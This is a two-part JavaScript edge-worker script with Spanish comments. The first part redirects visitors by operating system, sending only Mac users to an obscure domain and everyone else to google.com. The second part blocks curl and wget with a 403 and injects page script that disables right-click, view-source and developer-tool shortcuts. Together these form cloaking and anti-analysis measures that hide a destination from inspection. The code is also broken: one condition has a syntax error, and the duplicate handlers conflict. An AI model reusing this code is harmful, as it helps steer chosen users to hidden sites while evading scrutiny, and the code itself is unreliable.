// sistema operativo inicio...

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const userAgent = request.headers.get("user-agent").toLowerCase();

  let redirectUrl;

  if (userAgent.includes("windows")) {
    redirectUrl = "https://www.google.com";
  } else if (userAgent.includes("mac")) {
    redirectUrl = "https://megadoll.club";
  } else if (userAgent.includes("linux")) {
    redirectUrl = "https://www.google.com";
  } else {
    redirectUrl = "https://www.google.com"; // Fallback
  }

  return Response.redirect(redirectUrl, 302);
}


// sistema operativo fin


// restricciones comienzo


addEventListener("fetch", event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const userAgent = request.headers.get("User-Agent") || "";

    // Bloquear curl y wget
    const blockedAgents = ["curl", "wget"];
    if (blockedAgents.some(agent => userAgent.toLowerCase().includes(agent))) {
        return new Response("", { 
            status: 403, 
            headers: { "Content-Type": "text/plain" } 
        });
    }

    // Obtener respuesta original
    const response = await fetch(request);

    // Solo modificar respuestas HTML
    const contentType = response.headers.get("Content-Type") || "";
    if (contentType.includes("text/html")) {
        let body = await response.text();

        // Insertar script en el HTML
        const blockScripts = `
            <script>
                // Bloquear menú contextual
                document.addEventListener('contextmenu', event => event.preventDefault());

                // Bloquear acceso al código fuente (Ctrl+U y Ctrl+Shift+I)
                document.addEventListener('keydown', event => {
                    if (event.ctrlKey && (event.key === 'u' || event.key === 'U' || event.key === 'i' || event.key === 'I' || event.key === 's' | event.key 'F12')) {
                        event.preventDefault();
                    }
                });
            </script>
        `;

        // Inyectar el script antes del cierre de </body>
        body = body.replace("</body>", `${blockScripts}</body>`);

        return new Response(body, {
            status: response.status,
            headers: response.headers,
        });
    }

    // Para otros tipos de contenido, devolver la respuesta original
    return response;
}

// restricciones fin